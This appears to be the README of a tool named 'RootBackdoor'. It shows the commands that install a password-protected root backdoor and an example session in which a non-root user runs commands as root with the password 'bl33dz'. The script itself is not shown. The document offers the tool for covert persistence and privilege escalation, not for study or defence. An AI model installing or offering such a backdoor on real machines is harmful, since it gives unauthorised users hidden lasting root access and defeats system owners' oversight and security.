# RootBackdoor

Usage:
```
# chmod +x backdoor.sh
# ./backdoor.sh <backdoor> <password>
```

As non-root user run:
```
$ <backdoor> <password> <command>
```

Example:
```
root@machine:~# ./backdoor.sh root bl33dz
root@machine:~# su user
user@machine:~$ whoami
user
user@machine:~$ root bl33dz whoami
root
```
